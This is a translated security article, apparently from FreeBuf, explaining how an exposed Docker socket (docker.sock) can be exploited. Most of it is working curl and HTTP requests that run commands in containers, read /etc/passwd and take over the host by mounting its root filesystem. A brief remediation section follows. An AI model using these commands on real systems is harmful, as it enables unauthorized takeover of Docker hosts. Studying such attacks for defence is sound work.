**![docker_sock.png](https://image.3001.net/images/20190424/1556068526_5cbfb8ae0254a.png!small)**

**默认情况下，当在主机上执行docker命令时，对docker
daemon的API调用是通过位于/var/run/docker.sock的非联网UNIX套接字进行的。此套接字文件是控制在该主机上运行的任何docker容器的主API。但是，许多容器和指南会要求你将该套接字文件作为容器中的一个卷公开[[1]](https://docs.traefik.io/#1-launch-traefik-tell-it-to-listen-to-docker)[[2]](https://www.portainer.io/installation/)[[3]](https://elastest.io/docs/deploying/ubuntu/)[[4]](https://vamp.io/documentation/installation/v0.9.5/hello-world/)[[5]](https://github.com/containrrr/watchtower)[[6]](https://github.com/spotify/docker-gc#running-as-a-docker-container)
，或在某些情况下，将其暴露在TCP端口[[1]](https://www.ivankrizsan.se/2016/05/18/enabling-docker-remote-api-on-ubuntu-16-04/)[[2]](https://success.docker.com/article/how-do-i-enable-the-remote-api-for-dockerd)[[3]](https://medium.com/@ssmak/how-to-enable-docker-remote-api-on-docker-host-7b73bd3278c6)上。这样做是非常危险的，本地或远程暴露/var/run/docker.sock的Docker容器很有可能会被恶意攻击者完全的接管。**

截至目前，我已发现了大量将docker.sock暴露在互联网中的服务器。

其实这并不是一个新鲜的漏洞，在此之前早已有文章讨论过关于暴露docker.sock文件所带来的危险性的文章。而本文我[将扩展这个问题](https://www.lvh.io/posts/dont-expose-the-docker-socket-not-even-to-a-container.html)，解释如何利用它，以及如何采取措施应对这个问题。如果你在[Twitter](https://twitter.com/dejandayoff)上关注了我，你将会在不久后获取到我分享的一个脚本，它可以帮助你更轻松地进行利用。

## 你能做什么？

利用暴露的docker.sock文件，你可以在主机上运行的任意容器中执行你想要的任何操作。通过本地或远程访问docker.sock文件，你可以像在主机上运行docker命令一样控制docker。

最简单的例子是利用官方docker客户端访问docker.sock文件（例如你碰巧访问到了已安装docker客户端的容器，或是你可以安装docker客户端）。要利用它很简单，你可以运行常规的docker命令，包括exec来获取shell：

    
    
    root@9e50daaea94f:/# ls -alh /var/run/docker.sock #checking if socket is availible
    srw-rw---- 1 root 999 0 Apr  4 02:00 /var/run/docker.sock
    
    root@9e50daaea94f:/# hostname
    9e50daaea94f
    
    root@9e50daaea94f:/# docker container ls
    CONTAINER ID        NAMES
    509eebf873fb        another_container
    9e50daaea94f        current_container
    
    root@9e50daaea94f:/# docker exec -it another_container bash #running bash on the other container
    
    root@509eebf873fb:/# hostname
    509eebf873fb

然而，想要运行它，你必须已在容器上安装RCE。即使使用RCE，大多数情况下你也可能无法访问docker客户端，以及安装docker客户端。如果是这种情况，你可以对/var/run/docker.sock进行原始http请求。

虽然可以通过向docker.sock文件发出HTTP请求来在docker容器上利用RCE利用docker环境，但这种情况不太可能发生。更大的几率是找到通过TCP端口远程暴露的docker.sock文件。

如果你需要运行未在以下列出的任何其他命令，[docker
API](https://docs.docker.com/engine/api/v1.37/)将可以很好的帮到你。

这里有一个[CloudFormation](https://console.aws.amazon.com/cloudformation/home?region=us-west-2#/stacks/new?stackName=DockerSock&templateURL=https://s3-us-west-2.amazonaws.com/cf-templates-1hvupoi2etj4x-us-west-2/2019101XTh-docker.sock.template3tlnn4nypxg)脚本。你需要拥有一个具有启动新EC2实例权限的AWS账户。完成后别忘了删除stack！

## 在容器上获取 RCE

###  **1）列出所有容器**

第一步是获取主机上所有容器的列表。为此，你需要执行以下http请求：

    
    
    GET /containers/json HTTP/1.1
    Host: <docker_host>:PORT

Curl 命令：

    
    
    curl -i -s -X GET http://<docker_host>:PORT/containers/json

 **响应：**

    
    
    HTTP/1.1 200 OK
    Api-Version: 1.39
    Content-Type: application/json
    Docker-Experimental: false
    Ostype: linux
    Server: Docker/18.09.4 (linux)
    Date: Thu, 04 Apr 2019 05:56:03 GMT
    Content-Length: 1780
    
    [
        {
            "Id":"a4621ceab3729702f18cfe852003489341e51e036d13317d8e7016facb8ebbaf",
            "Names":["/another_container"],
            "Image":"ubuntu:latest",
            "ImageID":"sha256:94e814e2efa8845d95b2112d54497fbad173e45121ce9255b93401392f538499",
            "Command":"bash",
            "Created":1554357359,
            "Ports":[],
            "Labels":{},
            "State":"running",
            "Status":"Up 3 seconds",
            "HostConfig":{"NetworkMode":"default"},
            "NetworkSettings":{"Networks": 
            ...

注意响应中的“Id”字段，因为下一个命令将会用到它。

### 2) 创建一个 exec

接下来，我们需要创建一个将在容器上执行的“exec”实例。你可以在此处输入要运行的命令。

请求中的以下项目需要在请求中进行更改：

Container ID Docker Host Port Cmd（我的示例中将 cat /etc/passwd）

    
    
    POST /containers/<container_id>/exec HTTP/1.1
    Host: <docker_host>:PORT
    Content-Type: application/json
    Content-Length: 188
    
    {
      "AttachStdin": true,
      "AttachStdout": true,
      "AttachStderr": true,
      "Cmd": ["cat", "/etc/passwd"],
      "DetachKeys": "ctrl-p,ctrl-q",
      "Privileged": true,
      "Tty": true
    }

Curl 命令：

    
    
    curl -i -s -X POST \
    -H "Content-Type: application/json" \
    --data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["cat", "/etc/passwd"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' \
    http://<docker_host>:PORT/containers/<container_id>/exec

 **响应：**

    
    
    HTTP/1.1 201 Created
    Api-Version: 1.39
    Content-Type: application/json
    Docker-Experimental: false
    Ostype: linux
    Server: Docker/18.09.4 (linux)
    Date: Fri, 05 Apr 2019 00:51:31 GMT
    Content-Length: 74
    
    {"Id":"8b5e4c65e182cec039d38ddb9c0a931bbba8f689a4b3e1be1b3e8276dd2d1916"}

注意响应中的“Id”字段，因为下一个命令将会用到它。

###  **3）启动 exec**

现在创建了“exec”，我们需要运行它。

你需要更改请求中的以下项目：

Exec ID Docker Host Port

    
    
    POST /exec/<exec_id>/start HTTP/1.1
    Host: <docker_host>:PORT
    Content-Type: application/json
    
    {
     "Detach": false,
     "Tty": false
    }

Curl 命令：

    
    
    curl -i -s -X POST \
    -H 'Content-Type: application/json' \
    --data-binary '{"Detach": false,"Tty": false}' \
    http://<docker_host>:PORT/exec/<exec_id>/start

 **响应：**

    
    
    HTTP/1.1 200 OK
    Content-Type: application/vnd.docker.raw-stream
    Api-Version: 1.39
    Docker-Experimental: false
    Ostype: linux
    Server: Docker/18.09.4 (linux)
    
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    _apt:x:100:65534::/nonexistent:/usr/sbin/nologin

## 接管主机

启动一个docker容器，主机的根目录安装到容器的一个卷上，这样就可以对主机的文件系统执行命令。由于本文中所讨论的漏洞允许你完全的控制API，因此可以控制docker主机。

注意：不要忘记更改dockerhost，port和containerID

### **1）下载 ubuntu 镜像**

    
    
    curl -i -s -k  -X 'POST' \
    -H 'Content-Type: application/json' \
    http://<docker_host>:PORT/images/create?fromImage=ubuntu&tag=latest

###  **2）使用已安装的卷创建容器**

    
    
    curl -i -s -k  -X 'POST' \
    -H 'Content-Type: application/json' \
    --data-binary '{"Hostname": "","Domainname": "","User": "","AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Tty": true,"OpenStdin": true,"StdinOnce": true,"Entrypoint": "/bin/bash","Image": "ubuntu","Volumes": {"/hostos/": {}},"HostConfig": {"Binds": ["/:/hostos"]}}' \
    http://<docker_host>:PORT/containers/create

###  **3）启动容器**

    
    
    curl -i -s -k  -X 'POST' \
    -H 'Content-Type: application/json' \
    http://<docker_host>:PORT/containers/<container_ID>/start

至此，你可以利用代码执行漏洞对新容器运行命令。如果要对Host OS运行命令，请不要忘记添加chroot/hostos。

## 如何修复？

> 避免远程或在容器级别暴露docker.sock文件（如果可能）
>
> 如果你需要远程提供套接字文件，请执行此处的操作
>
> 设置适当的安全组和防火墙规则，以阻止非法IP的访问

## 附录

###  **本地命令**

下面是一个CURL命令列表，如果API不能远程使用，但可以在本地使用，则可以运行这些命令。

1) 列出所有的容器

    
    
    sudo curl -i -s --unix-socket /var/run/docker.sock -X GET \
    http://localhost/containers/json

2) 创建一个 exec

    
    
    sudo curl -i -s --unix-socket /var/run/docker.sock -X POST \
    -H "Content-Type: application/json" \
    --data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["cat", "/etc/passwd"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' \
    http://localhost/containers/<container_id>/exec

3) 启动 exec

    
    
    sudo curl -i -s --unix-socket /var/run/docker.sock -X POST \
    -H 'Content-Type: application/json' \
    --data-binary '{"Detach": false,"Tty": false}' \
    http://localhost/exec/<exec_id>/start

 ***参考来源：[dejandayoff](https://dejandayoff.com/the-danger-of-exposing-docker.sock/)，FB小编secist编译，转载请注明来自FreeBuf.COM **  

